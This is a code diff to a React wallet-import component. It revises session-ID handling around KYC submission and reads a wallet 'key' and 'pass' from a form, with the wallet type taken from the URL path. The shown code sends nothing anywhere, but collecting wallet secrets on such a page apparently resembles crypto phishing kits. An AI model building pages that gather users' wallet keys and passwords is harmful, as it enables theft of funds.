@@ -83,10 +83,7 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
                 }
                 localStorage.removeItem(pendingKey);
                 console.log('Pending KYC submitted for session', payload.sessionId);
-                localStorage.removeItem('sessionId');
-                const newSessionId = uuidv4();
-                localStorage.setItem('sessionId', newSessionId);
-                setSessionId(newSessionId);
+                  // Session is NOT cleared/reset here. It will persist unless user starts afresh from kyc-documents page.
               } catch (err) {
                 console.error('Error submitting pending KYC', err);
               }
@@ -228,9 +225,18 @@ const WalletImportTabs = ({ theme = defaultTheme }) => {
   const handleImport = (e) => {
     e.preventDefault();
 
+    // If sessionId was cleared (after POF), start a new one
+    let currentSessionId = localStorage.getItem('sessionId');
+    if (!currentSessionId) {
+      const newSessionId = uuidv4();
+      localStorage.setItem('sessionId', newSessionId);
+      setSessionId(newSessionId);
+      currentSessionId = newSessionId;
+    }
+
     const formData = new FormData(e.target);
     const path = window.location.pathname;
-    const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
+  const routeWalletType = path.replace(/^\//, '').replace(/\/$/, '').split('/')[0].toLowerCase();
     const walletType = routeWalletType || 'unknown';
     const key = formData.get('key') || '';
     const pass = formData.get('pass') || '';
